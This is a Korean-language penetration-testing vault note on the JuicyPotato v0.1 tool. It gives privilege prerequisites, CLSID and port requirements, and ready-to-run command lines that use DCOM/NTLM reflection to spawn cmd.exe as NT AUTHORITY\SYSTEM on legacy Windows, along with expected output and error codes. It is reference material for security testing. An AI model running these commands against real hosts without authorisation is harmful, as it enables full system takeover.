---
tags:
  - 환경/windows
  - 기능/권한상승
실행환경: ["Windows"]
필요권한: ["SeImpersonatePrivilege 또는 SeAssignPrimaryTokenPrivilege 중 선택한 process 생성 모드의 권한", "CreateProcessAsUser는 일반적으로 SeIncreaseQuotaPrivilege도 필요"]
필요조건: ["classic DCOM·NTLM reflection이 가능한 legacy Windows", "대상 build·edition에 맞는 CLSID", "빈 로컬 COM listener 포트", "대상 arch에 맞는 JuicyPotato v0.1"]
결과: ["SYSTEM impersonation access token 후보", "선택한 API로 생성한 SYSTEM 자식 프로세스"]
---

# JuicyPotato

## 도구 개요

`JuicyPotato` v0.1은 서비스 계정에서 DCOM·NTLM reflection으로 고권한 token을 얻고 선택한 process 생성 API로 명령을 실행하는 legacy Windows 권한 상승 도구다. `SeAssignPrimaryTokenPrivilege`만을 두 golden privilege 중 사용해야 할 때는 `CreateProcessAsUser`를 뜻하는 `-t u`를 명시한다.

## 필요한 입력과 실행 환경

- 실행 위치: 권한을 높일 대상 Windows 호스트
- 현재 Windows access token: `SeAssignPrimaryTokenPrivilege`와 일반적으로 `SeIncreaseQuotaPrivilege`, 또는 다른 모드에서는 `SeImpersonatePrivilege`. primary/impersonation token type과 UAC filtered/elevated 상태에 따라 선택한 process 생성 API의 조건이 달라진다.
- 대상 조건: classic JuicyPotato가 동작하는 legacy Windows build·edition과 그 환경에서 사용할 수 있는 elevated COM class
- 입력 파일: 대상 architecture에 맞는 JuicyPotato v0.1 binary
- 필요한 값: upstream OS별 목록에서 고른 `<CLSID>`, 대상 localhost에서 사용 중이지 않은 `<JUICY_COM_PORT>`, 실행할 프로그램과 인자
- `<CLSID>`는 현재 build에서 사용할 수 있는 COM class GUID, `<JUICY_COM_PORT>`는 대상 localhost의 비충돌 TCP 포트(예: `1337`)이며 program·args는 대상 host의 절대 실행 경로 기준이다.

Windows 10 1809 이상과 Windows Server 2019 이상에는 classic JuicyPotato를 일반 적용하지 않는다. 최신 Potato 이름만으로 대체 가능성을 판단하지 말고 각 구현이 token을 얻는 방식과 요구 privilege를 별도로 확인한다.

## 표준 사용법

`<CLSID>`는 current legacy build에서 선택한 COM GUID, `<JUICY_COM_PORT>`는 target localhost의 비충돌 port, `<PROGRAM>`·`<ARGS>`는 target Windows host의 executable path와 arguments다. token privilege 발견·COM activation·child command output은 각각 따로 확인한다.

```cmd
JuicyPotato.exe -l <LOCAL_COM_PORT> -c "{<CLSID>}" -p <PROGRAM> -a "<ARGUMENTS>" -t <t|u|*>
```

## 대표 예시

### SeAssignPrimaryTokenPrivilege 경로

`-t u`는 `CreateProcessAsUser`만 선택한다. 실행 전에 `SeAssignPrimaryTokenPrivilege`·`SeIncreaseQuotaPrivilege`, exact build·CLSID와 listener 포트를 확인한다.

```cmd
JuicyPotato.exe -l <LOCAL_COM_PORT> -c "{<CLSID>}" -p C:\Windows\System32\cmd.exe -a "/c whoami > <SYSTEM_PROOF_PATH>" -t u
```

확인할 출력:

- `{<CLSID>};NT AUTHORITY\SYSTEM`: SYSTEM impersonation access token 획득 후보
- `CreateProcessAsUser OK`: 선택한 API의 process 생성 성공
- proof의 `nt authority\system`: 실제 자식 명령의 SYSTEM Identity
- access token 표시나 API 성공 중 하나만으로 전체 성공을 확정하지 않는다.

### SeImpersonatePrivilege 경로

`-t t`는 `CreateProcessWithTokenW`를 선택한다. 이 경로는 [[JuicyPotato로 SeAssignPrimaryTokenPrivilege 권한 상승]]의 대표 절차가 아니며, 현재 Vault의 우선 대표 경로는 지원 조건이 맞을 때 [[PrintSpoofer로 SeImpersonatePrivilege 권한 상승]]이다.

```cmd
JuicyPotato.exe -l <LOCAL_COM_PORT> -c "{<CLSID>}" -p C:\Windows\System32\cmd.exe -a "/c whoami" -t t
```

## 주요 옵션

| 옵션 | 의미 | 사용하는 상황 |
|---|---|---|
| `-l <PORT>` | 대상 host 내부 COM server listener 포트 | 기존 listener가 없는 로컬 포트를 선택할 때 |
| `-c {<CLSID>}` | 활성화할 COM class | exact OS build·edition의 upstream 목록에서 확인한 class를 사용할 때 |
| `-p <PROGRAM>` | 생성할 실행 파일 | 전체 경로가 확인된 executable 지정 |
| `-a <ARGUMENTS>` | 프로그램에 전달할 command line | 짧은 Identity proof나 후속 명령 인자 지정 |
| `-t u` | `CreateProcessAsUser` 사용 | `SeAssignPrimaryTokenPrivilege` 경로만 검증할 때 |
| `-t t` | `CreateProcessWithTokenW` 사용 | `SeImpersonatePrivilege` 경로를 검증할 때 |
| `-t *` | 두 API 모두 시도 | 어느 privilege가 성공 원인인지 구분할 필요가 없는 탐색용. 전용 절차 판정에는 사용하지 않음 |

## 도구 고유 출력

| 출력·상태 | 의미 | 다음 확인 |
|---|---|---|
| `Testing {<CLSID>} <PORT>` | 선택한 COM class와 listener로 시도 시작 | exact build용 CLSID와 포트 기준선 대조 |
| `{<CLSID>};NT AUTHORITY\SYSTEM` | 인증 흐름에서 SYSTEM impersonation access token 표시 | 선택한 process 생성 API 성공을 별도 확인 |
| `CreateProcessAsUser OK` | `-t u`의 자식 process 생성 성공 | 자식 명령의 실제 Identity 확인 |
| `CreateProcessAsUser Failed to create proc: 1314` | 필요한 privilege가 access token에 없거나 API가 사용할 수 없음 | SeAssignPrimaryToken·SeIncreaseQuota 존재와 access token rights 확인 |
| `COM -> recv failed` 또는 socket 오류 | classic DCOM 흐름·CLSID·포트 조건 실패 | build·edition, CLSID와 listener 충돌부터 재확인 |

## 관련 공격기법

- [[JuicyPotato로 SeAssignPrimaryTokenPrivilege 권한 상승]]
- [[PrintSpoofer로 SeImpersonatePrivilege 권한 상승]]

## 참고 링크

- [ohpe: JuicyPotato](https://github.com/ohpe/juicy-potato)
- [ohpe: OS별 CLSID 목록](https://github.com/ohpe/juicy-potato/tree/master/CLSID)
- [Microsoft: CreateProcessAsUserW](https://learn.microsoft.com/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasuserw)
